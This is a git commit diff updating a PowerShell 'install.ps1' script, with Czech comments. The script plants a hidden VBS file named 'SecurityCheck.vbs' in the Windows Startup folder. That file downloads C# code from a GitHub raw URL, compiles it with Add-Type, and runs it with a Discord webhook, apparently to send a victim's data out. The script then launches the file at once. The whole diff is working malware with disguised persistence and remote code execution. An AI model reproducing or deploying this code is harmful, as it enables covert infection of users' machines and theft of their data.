25aa4d97d7f4d565faaeb1d29b29e03b993b5023
jfheifohfai <168677903+jfheifohfai@users.noreply.github.com>
2026-04-11 21:07:17 +0200

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -2,11 +2,13 @@ $webhook = "https://discord.com/api/webhooks/1491728198092849215/DkCsPFapma_HMcU
 $github = "https://raw.githubusercontent.com/jfheifohfai/diwidwidid/refs/heads/main/bot.cs"
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SecurityCheck.vbs"
 
-$vbsCode = @"
-Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "powershell -WindowStyle Hidden -Command `$w='''$webhook'''; `$g='''$github'''; `$c=(iwr -UseBasicParsing `$g).Content; Add-Type -TypeDefinition `$c -ReferencedAssemblies '''System.Management''','''System.Net.Http''','''System.Drawing''','''System.Windows.Forms''','''System.IO'''; [Program]::Main(`$w)", 0, False
-"@
+# Příkaz, který ti právě fungoval (upravený pro VBS)
+$innerCmd = "powershell -WindowStyle Hidden -Command `"`$w='$webhook'; `$g='$github'; `$c=(iwr -UseBasicParsing `$g).Content; Add-Type -TypeDefinition `$c -ReferencedAssemblies 'System.Management','System.Net.Http','System.Drawing','System.Windows.Forms','System.IO'; [Program]::Main(`$w)`" "
 
-[System.IO.File]::WriteAllText($startupPath, $vbsCode)
+# Vytvoření VBS souboru
+$vbsContent = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$innerCmd`", 0, False"
 
+[System.IO.File]::WriteAllText($startupPath, $vbsContent)
+
+# Okamžité spuštění pro test
 wscript.exe $startupPath
